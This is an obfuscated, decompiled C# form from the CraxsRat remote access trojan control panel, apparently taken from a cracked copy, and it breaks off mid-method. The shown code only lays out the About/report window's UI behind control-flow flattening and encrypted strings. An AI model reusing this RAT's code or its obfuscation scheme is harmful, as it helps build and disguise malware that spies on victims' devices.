// Decompiled with JetBrains decompiler
// Type: Craxs_Rat.CraxsAbout
// Assembly: CraxsRat, Version=6.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 518449F5-7012-4EDA-9924-A26EC676C6A1
// Assembly location: C:\Users\HP\Downloads\CraxsRat v6.8 by TG @Hackfilter - Copy\CraxsRat VIP\CraxsRat_protected.exe

using DrakeUI.Framework;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;

#nullable disable
namespace Craxs_Rat
{
  [DesignerGenerated]
  public class CraxsAbout : Form
  {
    public Craxs_Rat.sockets.Client Classclient;
    private IContainer components;
    public string Title;
    public Craxs_Rat.sockets.Client ClassClient;
    public TcpClient Client;
    public string DownloadsFolder;
    private IContainer components;

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
label_1:
      int num1 = -1888604886;
      ComponentResourceManager componentResourceManager;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ((-~num1 - 664919063) * 412711661 * -1439303189)) % 198U)
        {
          case 0:
            this.Label9.Text = EXGuarder.\u003404F4A2C;
            this.Label9.TextAlign = ContentAlignment.MiddleCenter;
            this.Label9.Visible = false;
            num1 = (int) num2 * -194861779 ^ 1886570158;
            continue;
          case 1:
            this.PictureBox5.Size = new Size(79, 87);
            num1 = (int) num2 * -915129548 ^ -636492793;
            continue;
          case 2:
            this.PictureBox3.Location = new Point(668, 341);
            this.PictureBox3.Name = EXGuarder.\u00359203807;
            num1 = (int) num2 * 2119827897 ^ 1712161596;
            continue;
          case 3:
            this.DrakeUIButton1.TabIndex = 48;
            num1 = (int) num2 * -1033758879 ^ 116259181;
            continue;
          case 4:
            this.toppanel.Controls.Add((Control) this.DrakeUIButton4);
            num1 = (int) num2 * -214642291 ^ 299452957;
            continue;
          case 5:
            this.Label4.Size = new Size(79, 39);
            this.Label4.TabIndex = 29;
            this.Label4.Text = EXGuarder.\u00321357325;
            num1 = (int) num2 * 1855574862 ^ 439774957;
            continue;
          case 6:
            this.Label8.Font = new Font(EXGuarder.\u003552B5653, 9f, FontStyle.Bold);
            num1 = (int) num2 * -1437501067 ^ 2062996607;
            continue;
          case 7:
            this.DrakeUIButton1.Size = new Size(230, 54);
            num1 = (int) num2 * -929764350 ^ 1622278553;
            continue;
          case 8:
            this.bdytext.Style = UIStyle.Custom;
            this.bdytext.StyleCustomMode = true;
            num1 = (int) num2 * 1087086686 ^ -1565090145;
            continue;
          case 9:
            this.PictureBox1 = new PictureBox();
            this.DrakeUIToolTip1 = new DrakeUIToolTip(this.components);
            num1 = (int) num2 * 702077131 ^ 1775036325;
            continue;
          case 10:
            this.reqbtn.RectDisableColor = Color.FromArgb(20, 20, 20);
            this.reqbtn.Size = new Size(126, 33);
            num1 = (int) num2 * 2038473253 ^ 74714827;
            continue;
          case 11:
            this.bdytext.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num2 * -229814053 ^ 1586488765;
            continue;
          case 12:
            this.bdytext.Location = new Point(133, 75);
            num1 = (int) num2 * 1259166477 ^ -1705173805;
            continue;
          case 13:
            this.DrakeUIAvatar6.Cursor = Cursors.Hand;
            this.DrakeUIAvatar6.Dock = DockStyle.Right;
            num1 = (int) num2 * 514830644 ^ 835728892;
            continue;
          case 14:
            this.Label6.Margin = new Padding(4, 0, 4, 0);
            num1 = (int) num2 * 2084398537 ^ 1585448428;
            continue;
          case 15:
            this.aboutpanel.Controls.Add((Control) this.Label9);
            num1 = (int) num2 * 1873713391 ^ 1235028910;
            continue;
          case 16:
            this.bdytext.Padding = new Padding(7, 6, 7, 6);
            num1 = (int) num2 * 1281504269 ^ -95237882;
            continue;
          case 17:
            this.Label9.Margin = new Padding(4, 0, 4, 0);
            num1 = (int) num2 * -1891515146 ^ -200668036;
            continue;
          case 18:
            this.Label9.Size = new Size(79, 39);
            this.Label9.TabIndex = 31;
            num1 = (int) num2 * -719596978 ^ 275610656;
            continue;
          case 19:
            this.DrakeUIAvatar6.Text = EXGuarder.\u00364533B60;
            this.DrakeUIToolTip1.SetToolTip((Control) this.DrakeUIAvatar6, EXGuarder.\u003610E5078);
            num1 = (int) num2 * 1139069258 ^ -377985032;
            continue;
          case 20:
            this.Label7.BackColor = Color.Transparent;
            num1 = (int) num2 * 1208368589 ^ 1239066984;
            continue;
          case 21:
            this.DrakeUIAvatar6.AvatarSize = 25;
            num1 = (int) num2 * -1991951928 ^ -1097278449;
            continue;
          case 22:
            goto label_1;
          case 23:
            this.reportpanel.ResumeLayout(false);
            num1 = (int) num2 * 1188920918 ^ -1834334040;
            continue;
          case 24:
            this.Label3.BackColor = Color.Black;
            num1 = (int) num2 * -811405803 ^ 639856658;
            continue;
          case 25:
            this.PictureBox3.Visible = false;
            num1 = (int) num2 * -1210265718 ^ 435164986;
            continue;
          case 26:
            this.Label5.Font = new Font(EXGuarder.\u003552B5653, 12f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num2 * 216045681 ^ 1307701655;
            continue;
          case 27:
            this.Label6.FlatStyle = FlatStyle.Flat;
            num1 = (int) num2 * 1912073921 ^ 831467930;
            continue;
          case 28:
            this.PictureBox6 = new PictureBox();
            this.PictureBox5 = new PictureBox();
            num1 = (int) num2 * 524844148 ^ 1951942615;
            continue;
          case 29:
            this.bdytext.TabIndex = 42;
            num1 = (int) num2 * 1934700055 ^ -1727857970;
            continue;
          case 30:
            this.bdytext.Size = new Size(872, 459);
            num1 = (int) num2 * -6000400 ^ 2112973668;
            continue;
          case 31:
            this.Label4.Location = new Point(477, 431);
            num1 = (int) num2 * -382708189 ^ 1227727918;
            continue;
          case 32:
            this.Label6.Location = new Point(13, 75);
            num1 = (int) num2 * 1172655575 ^ 615167870;
            continue;
          case 33:
            this.DrakeUIToolTip1.ForeColor = Color.FromArgb(239, 239, 239);
            this.DrakeUIToolTip1.OwnerDraw = true;
            num1 = (int) num2 * 1723171857 ^ -1248127631;
            continue;
          case 34:
            this.PictureBox4.Cursor = Cursors.Hand;
            num1 = (int) num2 * -1528118888 ^ -1980174928;
            continue;
          case 35:
            this.Label6.Text = EXGuarder.\u0033D4C6949;
            this.Label6.TextAlign = ContentAlignment.MiddleCenter;
            this.Label5.AutoSize = true;
            this.Label5.Cursor = Cursors.Default;
            this.Label5.FlatStyle = FlatStyle.Flat;
            num1 = (int) num2 * -538658481 ^ -1105309507;
            continue;
          case 36:
            this.PictureBox6.Name = EXGuarder.\u0030C404360;
            this.PictureBox6.Size = new Size(79, 87);
            this.PictureBox6.SizeMode = PictureBoxSizeMode.Zoom;
            this.PictureBox6.TabIndex = 26;
            this.PictureBox6.TabStop = false;
            this.DrakeUIToolTip1.SetToolTip((Control) this.PictureBox6, EXGuarder.\u00321357325);
            num1 = (int) num2 * -668942252 ^ -1657284170;
            continue;
          case 37:
            this.PictureBox1.SizeMode = PictureBoxSizeMode.StretchImage;
            this.PictureBox1.TabIndex = 22;
            num1 = (int) num2 * -1605347239 ^ -682263373;
            continue;
          case 38:
            this.DrakeUIButton4.RectDisableColor = Color.FromArgb((int) byte.MaxValue, (int) byte.MaxValue, 192);
            this.DrakeUIButton4.RectSides = ToolStripStatusLabelBorderSides.None;
            num1 = (int) num2 * -585031992 ^ -441715812;
            continue;
          case 39:
            this.Label4.Visible = false;
            num1 = (int) num2 * -481193816 ^ -974567390;
            continue;
          case 40:
            this.Label1.BackColor = Color.Black;
            num1 = (int) num2 * 452530775 ^ 1576851880;
            continue;
          case 41:
            this.bdytext.Cursor = Cursors.IBeam;
            this.bdytext.FillColor = Color.Black;
            this.bdytext.Font = new Font(EXGuarder.\u003552B5653, 12f);
            num1 = (int) num2 * -1945823915 ^ -1697782129;
            continue;
          case 42:
            this.Label5.Name = EXGuarder.\u0035B3B1E03;
            this.Label5.Size = new Size(71, 24);
            this.Label5.TabIndex = 40;
            num1 = (int) num2 * -651060320 ^ -1361835011;
            continue;
          case 43:
            this.Label1.Size = new Size(92, 39);
            num1 = (int) num2 * 587792735 ^ -584955944;
            continue;
          case 44:
            this.bdytext.Maximum = (double) int.MaxValue;
            num1 = (int) num2 * -227332803 ^ 2075410180;
            continue;
          case 45:
            this.bdytext = new DrakeUITextBox();
            num1 = (int) num2 * -348714251 ^ -92364687;
            continue;
          case 46:
            componentResourceManager = new ComponentResourceManager(typeof (CraxsAbout));
            num1 = (int) num2 * -389071808 ^ -1979465205;
            continue;
          case 47:
            this.Label4.Margin = new Padding(4, 0, 4, 0);
            num1 = (int) num2 * -1387364469 ^ 1889157574;
            continue;
          case 48:
            this.reportpanel.Controls.Add((Control) this.subtext);
            num1 = (int) num2 * 1167983688 ^ 2033131446;
            continue;
          case 49:
            this.subtext.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * 1715430496 ^ -1525892834;
            continue;
          case 50:
            this.DrakeUIButton4.RectColor = Color.Red;
            num1 = (int) num2 * -887884686 ^ 1191358784;
            continue;
          case 51:
            this.DrakeUIButton4.Name = EXGuarder.\u0036C0F004F;
            num1 = (int) num2 * -453982423 ^ 57062190;
            continue;
          case 52:
            this.Label1.Font = new Font(EXGuarder.\u003552B5653, 9f, FontStyle.Bold);
            this.Label1.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.Label1.Location = new Point(82, 431);
            num1 = (int) num2 * -1895153920 ^ 358689463;
            continue;
          case 53:
            this.DrakeUIAvatar6.Font = new Font(EXGuarder.\u003552B5653, 12f);
            this.DrakeUIAvatar6.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * 228394241 ^ -310063843;
            continue;
          case 54:
            this.Label6.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * 975483104 ^ -1548757562;
            continue;
          case 55:
            this.Label5.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * 1775521818 ^ 649838543;
            continue;
          case 56:
            this.PictureBox4.SizeMode = PictureBoxSizeMode.Zoom;
            this.PictureBox4.TabIndex = 24;
            this.PictureBox4.TabStop = false;
            num1 = (int) num2 * 880998573 ^ 1883383211;
            continue;
          case 57:
            this.Label8.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.Label8.Location = new Point(668, 431);
            num1 = (int) num2 * 764576516 ^ 143457251;
            continue;
          case 58:
            this.PictureBox6.Visible = false;
            num1 = (int) num2 * -2083861065 ^ -1767282713;
            continue;
          case 59:
            this.toppanel.Name = EXGuarder.\u003704C524A;
            this.toppanel.Size = new Size(1062, 54);
            this.toppanel.TabIndex = 49;
            this.DrakeUIButton4.Cursor = Cursors.Hand;
            this.DrakeUIButton4.Dock = DockStyle.Left;
            this.DrakeUIButton4.FillColor = Color.Black;
            this.DrakeUIButton4.FillDisableColor = Color.Red;
            this.DrakeUIButton4.Font = new Font(EXGuarder.\u003552B5653, 12f);
            this.DrakeUIButton4.Location = new Point(230, 0);
            num1 = (int) num2 * 235927684 ^ -337719215;
            continue;
          case 60:
            this.reportpanel.Size = new Size(1062, 834);
            this.reportpanel.TabIndex = 51;
            num1 = (int) num2 * 564460753 ^ -1536023073;
            continue;
          case 61:
            this.DrakeUIToolTip1.SetToolTip((Control) this.subtext, EXGuarder.\u0030A1B6335);
            num1 = (int) num2 * -897777845 ^ -1826320702;
            continue;
          case 62:
            this.Label7.Font = new Font(EXGuarder.\u003552B5653, 12f, FontStyle.Bold);
            this.Label7.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * 1288966043 ^ -1204084628;
            continue;
          case 63:
            this.PictureBox5.Cursor = Cursors.Hand;
            this.PictureBox5.Image = (Image) componentResourceManager.GetObject(EXGuarder.\u0031B34074C);
            this.PictureBox5.Location = new Point(286, 341);
            this.PictureBox5.Name = EXGuarder.\u0036C556051;
            num1 = (int) num2 * 964056267 ^ -1347968782;
            continue;
          case 64:
            this.Label3.Font = new Font(EXGuarder.\u003552B5653, 9f, FontStyle.Bold);
            num1 = (int) num2 * 1435623463 ^ -1068277363;
            continue;
          case 65:
            this.aboutpanel.Size = new Size(1062, 834);
            this.aboutpanel.TabIndex = 50;
            this.Label9.BackColor = Color.Black;
            num1 = (int) num2 * 778832072 ^ 1087078970;
            continue;
          case 66:
            this.DrakeUIAvatar6.FillColor = Color.Transparent;
            num1 = (int) num2 * -113022024 ^ 1084190325;
            continue;
          case 67:
            this.reqbtn.Style = UIStyle.Custom;
            this.reqbtn.Symbol = 61913;
            this.reqbtn.TabIndex = 44;
            this.reqbtn.Text = EXGuarder.\u0031F1B0034;
            this.Label7.AutoSize = true;
            num1 = (int) num2 * 555785813 ^ -1183251047;
            continue;
          case 68:
            this.Label9.Name = EXGuarder.\u0033F01161E;
            num1 = (int) num2 * -907695789 ^ 917038852;
            continue;
          case 69:
            this.Label3.TextAlign = ContentAlignment.MiddleCenter;
            this.Label3.Visible = false;
            num1 = (int) num2 * 165687262 ^ -1126126256;
            continue;
          case 70:
            this.subtext.Padding = new Padding(7, 6, 7, 6);
            num1 = (int) num2 * -1334698817 ^ -1857117951;
            continue;
          case 71:
            this.Label6.Size = new Size(104, 24);
            this.Label6.TabIndex = 42;
            this.Label6.Tag = (object) EXGuarder.\u003731D2A0F;
            num1 = (int) num2 * 80148988 ^ 873747143;
            continue;
          case 72:
            this.toppanel.Location = new Point(0, 0);
            num1 = (int) num2 * -940655007 ^ 485164375;
            continue;
          case 73:
            this.toppanel.Controls.Add((Control) this.DrakeUIButton1);
            this.toppanel.Dock = DockStyle.Top;
            num1 = (int) num2 * 1847936200 ^ -150955200;
            continue;
          case 74:
            this.reportpanel.Dock = DockStyle.Fill;
            this.reportpanel.Location = new Point(0, 54);
            num1 = (int) num2 * 717924122 ^ 1387488225;
            continue;
          case 75:
            this.DrakeUIAvatar6.Symbol = 61453;
            this.DrakeUIAvatar6.SymbolSize = 25;
            num1 = (int) num2 * 268131481 ^ 1519092832;
            continue;
          case 76:
            this.aboutpanel.Controls.Add((Control) this.Label1);
            num1 = (int) num2 * 2021663849 ^ -1104892336;
            continue;
          case 77:
            this.PictureBox5.SizeMode = PictureBoxSizeMode.Zoom;
            num1 = (int) num2 * -1994820868 ^ 1962707359;
            continue;
          case 78:
            this.PictureBox1.Size = new Size(92, 87);
            num1 = (int) num2 * -626537208 ^ 2113889527;
            continue;
          case 79:
            this.aboutpanel.Controls.Add((Control) this.Label8);
            num1 = (int) num2 * 484388455 ^ -539935856;
            continue;
          case 80:
            this.PictureBox4.Size = new Size(79, 87);
            num1 = (int) num2 * 1334137137 ^ 1160820300;
            continue;
          case 81:
            this.PictureBox6.Cursor = Cursors.Hand;
            this.PictureBox6.Image = (Image) componentResourceManager.GetObject(EXGuarder.\u0032C0F1D10);
            num1 = (int) num2 * -603277133 ^ -1084118593;
            continue;
          case 82:
            this.Label4.BackColor = Color.Black;
            this.Label4.Font = new Font(EXGuarder.\u003552B5653, 9f, FontStyle.Bold);
            this.Label4.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * 1163302864 ^ 1914178305;
            continue;
          case 83:
            this.reqbtn.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * 807057894 ^ -679401596;
            continue;
          case 84:
            this.DrakeUIAvatar6 = new DrakeUIAvatar();
            this.reqbtn = new DrakeUIButtonIcon();
            this.Label7 = new Label();
            this.Label6 = new Label();
            num1 = (int) num2 * 902802322 ^ -140948792;
            continue;
          case 85:
            this.aboutpanel.Name = EXGuarder.\u003712E570E;
            num1 = (int) num2 * 1786841328 ^ 366864991;
            continue;
          case 86:
            this.DrakeUIButton4.Visible = false;
            this.aboutpanel.BackColor = Color.Black;
            num1 = (int) num2 * 955362311 ^ -1901486445;
            continue;
          case 87:
            this.Label3.Location = new Point(286, 431);
            num1 = (int) num2 * -1043552501 ^ 1224425542;
            continue;
          case 88:
            this.DrakeUIButton1.Name = EXGuarder.\u003545F4A09;
            this.DrakeUIButton1.RadiusSides = UICornerRadiusSides.LeftBottom | UICornerRadiusSides.RightBottom;
            num1 = (int) num2 * 2016441347 ^ 2126612600;
            continue;
          case 89:
            this.FormBorderStyle = FormBorderStyle.None;
            num1 = (int) num2 * 1894445980 ^ 1489625798;
            continue;
          case 90:
            this.toppanel.ResumeLayout(false);
            num1 = (int) num2 * 1317672934 ^ -577513474;
            continue;
          case 91:
            this.DrakeUIAvatar6.TabIndex = 52;
            num1 = (int) num2 * 716859410 ^ 1457942185;
            continue;
          case 92:
            this.Label5 = new Label();
            num1 = (int) num2 * 270349759 ^ 1366124775;
            continue;
          case 93:
            this.PictureBox3 = new PictureBox();
            num1 = (int) num2 * -1565280292 ^ -480224965;
            continue;
          case 94:
            this.Label6.Name = EXGuarder.\u00343410169;
            num1 = (int) num2 * 617617684 ^ -2122725255;
            continue;
          case 95:
            this.Label6.Font = new Font(EXGuarder.\u003552B5653, 12f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num2 * 1823519508 ^ 1943108924;
            continue;
          case 96:
            this.PictureBox3.Cursor = Cursors.Hand;
            num1 = (int) num2 * 278230143 ^ 2090311168;
            continue;
          case 97:
            this.toppanel = new Panel();
            num1 = (int) num2 * 800953767 ^ 175175293;
            continue;
          case 98:
            this.DrakeUIButton4.Size = new Size(230, 54);
            this.DrakeUIButton4.Style = UIStyle.Custom;
            num1 = (int) num2 * -1957105145 ^ -760237650;
            continue;
          case 99:
            this.DrakeUIToolTip1.SetToolTip((Control) this.PictureBox4, EXGuarder.\u003404F4A2C);
            num1 = (int) num2 * -324953370 ^ -409407819;
            continue;
          case 100:
            this.DrakeUIButton1.Text = EXGuarder.\u0035F3B5965;
            num1 = (int) num2 * 1924280362 ^ -708160367;
            continue;
          case 101:
            this.subtext.TextAlignment = ContentAlignment.MiddleLeft;
            num1 = (int) num2 * -1889664573 ^ -81240064;
            continue;
          case 102:
            this.DrakeUIButton4.StyleCustomMode = true;
            num1 = (int) num2 * 917796696 ^ -1728749075;
            continue;
          case 103:
            this.DrakeUIButton1 = new DrakeUIButton();
            num1 = (int) num2 * 645277138 ^ -1246718617;
            continue;
          case 104:
            ((ISupportInitialize) this.PictureBox5).EndInit();
            ((ISupportInitialize) this.PictureBox3).EndInit();
            num1 = (int) num2 * 108570847 ^ 479558573;
            continue;
          case 105:
            this.Label6.Cursor = Cursors.Default;
            num1 = (int) num2 * -1011943306 ^ 1496539511;
            continue;
          case 106:
            this.subtext.FillColor = Color.Black;
            this.subtext.Font = new Font(EXGuarder.\u003552B5653, 12f);
            this.subtext.ForeColor = Color.White;
            num1 = (int) num2 * 682533817 ^ -1012160095;
            continue;
          case 107:
            this.Label6.AutoSize = true;
            num1 = (int) num2 * 1719651264 ^ -1051837001;
            continue;
          case 108:
            this.Label8.Name = EXGuarder.\u00349694862;
            num1 = (int) num2 * -1297695821 ^ -1404868504;
            continue;
          case 109:
            this.aboutpanel.Controls.Add((Control) this.PictureBox6);
            num1 = (int) num2 * -1475610272 ^ -1273137760;
            continue;
          case 110:
            this.Label8.Size = new Size(79, 39);
            this.Label8.TabIndex = 30;
            this.Label8.Text = EXGuarder.\u00337271D55;
            this.Label8.TextAlign = ContentAlignment.MiddleCenter;
            num1 = (int) num2 * 862260078 ^ -76982279;
            continue;
          case 111:
            this.Label3.Margin = new Padding(4, 0, 4, 0);
            this.Label3.Name = EXGuarder.\u00359522C1F;
            this.Label3.Size = new Size(79, 39);
            this.Label3.TabIndex = 28;
            this.Label3.Text = EXGuarder.\u00360452A71;
            num1 = (int) num2 * -1264905725 ^ -1367827014;
            continue;
          case 112:
            this.Label8.BackColor = Color.Black;
            num1 = (int) num2 * -2082931234 ^ -2007599938;
            continue;
          case 113:
            this.DrakeUIButton1.Visible = false;
            this.toppanel.Controls.Add((Control) this.DrakeUIAvatar6);
            num1 = (int) num2 * -1667337048 ^ 198573784;
            continue;
          case 114:
            this.Name = EXGuarder.\u0032E621F0C;
            this.ShowIcon = false;
            this.ShowInTaskbar = false;
            this.StartPosition = FormStartPosition.CenterScreen;
            this.Text = EXGuarder.\u0032E621F0C;
            this.TopMost = true;
            ((ISupportInitialize) this.PictureBox1).EndInit();
            ((ISupportInitialize) this.PictureBox4).EndInit();
            num1 = (int) num2 * 1775009267 ^ -679939086;
            continue;
          case 115:
            this.PictureBox4.Visible = false;
            this.subtext.Cursor = Cursors.IBeam;
            num1 = (int) num2 * 334084142 ^ 1485722894;
            continue;
          case 116:
            this.DrakeUIToolTip1.SetToolTip((Control) this.PictureBox1, EXGuarder.\u00324321F69);
            this.PictureBox1.Visible = false;
            num1 = (int) num2 * -209723850 ^ -934112490;
            continue;
          case 117:
            this.subtext.MaxLength = 15;
            this.subtext.Minimum = (double) int.MinValue;
            num1 = (int) num2 * -829801861 ^ -695302110;
            continue;
          case 118:
            this.Label1.TextAlign = ContentAlignment.MiddleCenter;
            this.Label1.Visible = false;
            num1 = (int) num2 * 721686014 ^ 482256855;
            continue;
          case 119:
            this.Label5.Tag = (object) EXGuarder.\u003731D2A0F;
            this.Label5.Text = EXGuarder.\u0033658451B;
            this.Label5.TextAlign = ContentAlignment.MiddleCenter;
            this.DrakeUIButton1.Cursor = Cursors.Hand;
            this.DrakeUIButton1.Dock = DockStyle.Left;
            this.DrakeUIButton1.FillColor = Color.Black;
            num1 = (int) num2 * 776642042 ^ 515041692;
            continue;
          case 120:
            this.PictureBox4.Image = (Image) componentResourceManager.GetObject(EXGuarder.\u00346604949);
            this.PictureBox4.Location = new Point(859, 341);
            num1 = (int) num2 * -887254146 ^ 1777026476;
            continue;
          case 121:
            this.DrakeUIAvatar6.Name = EXGuarder.\u0034F541271;
            num1 = (int) num2 * -1236064947 ^ -147481868;
            continue;
          case 122:
            this.bdytext.MaxLength = 150;
            num1 = (int) num2 * -1195331435 ^ 228081042;
            continue;
          case 123:
            this.Label8.Visible = false;
            this.AutoScaleDimensions = new SizeF(8f, 16f);
            this.AutoScaleMode = AutoScaleMode.Font;
            num1 = (int) num2 * 1231108392 ^ 521937617;
            continue;
          case 124:
            ((ISupportInitialize) this.PictureBox6).BeginInit();
            num1 = (int) num2 * -1034639308 ^ 2137017659;
            continue;
          case 125:
            this.subtext.Location = new Point(133, 27);
            this.subtext.Margin = new Padding(5, 6, 5, 6);
            this.subtext.Maximum = (double) int.MaxValue;
            num1 = (int) num2 * -708090967 ^ -2086785734;
            continue;
          case 126:
            this.DrakeUIButton1.Location = new Point(0, 0);
            num1 = (int) num2 * 797736527 ^ 264573706;
            continue;
          case (uint) sbyte.MaxValue:
            this.Label8.Margin = new Padding(4, 0, 4, 0);
            num1 = (int) num2 * 1656650768 ^ 1259750720;
            continue;
          case 128:
            this.aboutpanel.ResumeLayout(false);
            num1 = (int) num2 * 874275833 ^ 1010936613;
            continue;
          case 129:
            this.BackColor = Color.Black;
            num1 = (int) num2 * 750354725 ^ 1051670795;
            continue;
          case 130:
            this.Label7.TabIndex = 43;
            this.Label7.Text = EXGuarder.\u0033955771B;
            num1 = (int) num2 * 670320802 ^ -1618627885;
            continue;
          case 131:
            this.DrakeUIButton1.Style = UIStyle.Custom;
            this.DrakeUIButton1.StyleCustomMode = true;
            num1 = (int) num2 * 520489207 ^ -557742698;
            continue;
          case 132:
            this.PictureBox6.Location = new Point(477, 341);
            num1 = (int) num2 * -681407504 ^ -1174774192;
            continue;
          case 133:
            this.bdytext.Margin = new Padding(5, 6, 5, 6);
            num1 = (int) num2 * 89658812 ^ 270630734;
            continue;
          case 134:
            this.Controls.Add((Control) this.toppanel);
            num1 = (int) num2 * -351823046 ^ -378142001;
            continue;
          case 135:
            this.reqbtn.Name = EXGuarder.\u003743F254F;
            this.reqbtn.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * 1257865687 ^ 1891447429;
            continue;
          case 136:
            this.reqbtn.Location = new Point(879, 24);
            num1 = (int) num2 * -778039181 ^ -932916983;
            continue;
          case 137:
            this.Label7.Size = new Size(371, 24);
            num1 = (int) num2 * 675445806 ^ 459559138;
            continue;
          case 138:
            this.aboutpanel.Controls.Add((Control) this.PictureBox1);
            num1 = (int) num2 * -1169879824 ^ 1504935144;
            continue;
          case 139:
            this.Label9 = new Label();
            this.Label1 = new Label();
            this.reportpanel = new Panel();
            num1 = (int) num2 * 1076357435 ^ -1462543873;
            continue;
          case 140:
            this.DrakeUIButton1.RectColor = Color.Red;
            this.DrakeUIButton1.RectDisableColor = Color.FromArgb((int) byte.MaxValue, (int) byte.MaxValue, 192);
            num1 = (int) num2 * -132774501 ^ 1647424745;
            continue;
          case 141:
            this.DrakeUIButton4.TabIndex = 51;
            num1 = (int) num2 * -1421127209 ^ -1178772825;
            continue;
          case 142:
            this.ClientSize = new Size(1062, 888);
            num1 = (int) num2 * -1574493716 ^ -1247439724;
            continue;
          case 143:
            this.PictureBox1.Cursor = Cursors.Hand;
            this.PictureBox1.Image = (Image) componentResourceManager.GetObject(EXGuarder.\u00347503075);
            num1 = (int) num2 * 89242356 ^ 999377984;
            continue;
          case 144:
            this.PictureBox1.Location = new Point(82, 341);
            this.PictureBox1.Name = EXGuarder.\u003310E2D5F;
            num1 = (int) num2 * 782633272 ^ -748172184;
            continue;
          case 145:
            this.Label5.Location = new Point(13, 24);
            this.Label5.Margin = new Padding(4, 0, 4, 0);
            num1 = (int) num2 * -867121922 ^ 548099800;
            continue;
          case 146:
            this.DrakeUIButton1.FillDisableColor = Color.Red;
            this.DrakeUIButton1.Font = new Font(EXGuarder.\u003552B5653, 12f);
            num1 = (int) num2 * -1064133909 ^ 1963658140;
            continue;
          case 147:
            this.bdytext.Multiline = true;
            this.bdytext.Name = EXGuarder.\u0034D442F5A;
            num1 = (int) num2 * -228765018 ^ -553793902;
            continue;
          case 148:
            this.aboutpanel = new Panel();
            num1 = (int) num2 * -1404525862 ^ 1380598635;
            continue;
          case 149:
            this.toppanel.SuspendLayout();
            num1 = (int) num2 * 365964289 ^ -680783515;
            continue;
          case 150:
            this.bdytext.RectColor = Color.FromArgb(230, 80, 80);
            num1 = (int) num2 * 1946243997 ^ 189925581;
            continue;
          case 151:
            ((ISupportInitialize) this.PictureBox5).BeginInit();
            ((ISupportInitialize) this.PictureBox3).BeginInit();
            this.SuspendLayout();
            num1 = (int) num2 * 506825956 ^ 680803185;
            continue;
          case 152:
            this.subtext.Style = UIStyle.Custom;
            num1 = (int) num2 * -173094851 ^ 549474484;
            continue;
          case 153:
            this.Label3.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * -749113052 ^ 297802241;
            continue;
          case 154:
            this.aboutpanel.Controls.Add((Control) this.PictureBox3);
            this.aboutpanel.Controls.Add((Control) this.PictureBox5);
            num1 = (int) num2 * 1395065141 ^ -219841131;
            continue;
          case 155:
            this.bdytext.TextAlignment = ContentAlignment.TopLeft;
            this.DrakeUIToolTip1.SetToolTip((Control) this.bdytext, EXGuarder.\u0034610044F);
            num1 = (int) num2 * 1603534404 ^ -947383833;
            continue;
          case 156:
            this.Label9.Location = new Point(859, 431);
            num1 = (int) num2 * -1746775149 ^ 690750291;
            continue;
          case 157:
            this.subtext.Name = EXGuarder.\u0033B696313;
            num1 = (int) num2 * -306820260 ^ -614263536;
            continue;
          case 158:
            this.DrakeUIButton4.Text = EXGuarder.\u00304013441;
            num1 = (int) num2 * -1244396633 ^ 408953054;
            continue;
          case 160:
            this.DrakeUIButton4 = new DrakeUIButton();
            num1 = (int) num2 * -173812682 ^ -1097938622;
            continue;
          case 161:
            this.Label8 = new Label();
            ((ISupportInitialize) this.PictureBox1).BeginInit();
            num1 = (int) num2 * -2009659274 ^ -90596351;
            continue;
          case 162:
            this.aboutpanel.Controls.Add((Control) this.PictureBox4);
            this.aboutpanel.Dock = DockStyle.Fill;
            this.aboutpanel.Location = new Point(0, 54);
            num1 = (int) num2 * 1813037175 ^ 37630555;
            continue;
          case 163:
            this.reportpanel.SuspendLayout();
            num1 = (int) num2 * -1012064122 ^ -608775490;
            continue;
          case 164:
            this.PictureBox4 = new PictureBox();
            this.subtext = new DrakeUITextBox();
            num1 = (int) num2 * 255857718 ^ 61938181;
            continue;
          case 165:
            this.Label1.Margin = new Padding(4, 0, 4, 0);
            this.Label1.Name = EXGuarder.\u00330786471;
            num1 = (int) num2 * -325366522 ^ -962008515;
            continue;
          case 166:
            this.bdytext.Minimum = (double) int.MinValue;
            num1 = (int) num2 * 1962475483 ^ -1713286553;
            continue;
          case 167:
            this.Label3 = new Label();
            this.Label4 = new Label();
            num1 = (int) num2 * -1872494457 ^ -420504664;
            continue;
          case 168:
            this.Controls.Add((Control) this.aboutpanel);
            this.Controls.Add((Control) this.reportpanel);
            num1 = (int) num2 * 1522270332 ^ 1480878772;
            continue;
          case 169:
            this.Label1.TabIndex = 27;
            num1 = (int) num2 * -1341960842 ^ 1257617504;
            continue;
          case 170:
            this.DrakeUIToolTip1.BackColor = Color.FromArgb(54, 54, 54);
            num1 = (int) num2 * 676072908 ^ 378090067;
            continue;
          case 171:
            this.reportpanel.Name = EXGuarder.\u00314372D01;
            num1 = (int) num2 * -45465186 ^ 1603811818;
            continue;
          case 172:
            this.reqbtn.Cursor = Cursors.Hand;
            this.reqbtn.FillColor = Color.Black;
            this.reqbtn.FillDisableColor = Color.FromArgb(20, 20, 20);
            this.reqbtn.Font = new Font(EXGuarder.\u003552B5653, 12f);
            num1 = (int) num2 * -1218188295 ^ 1344839067;
            continue;
          case 173:
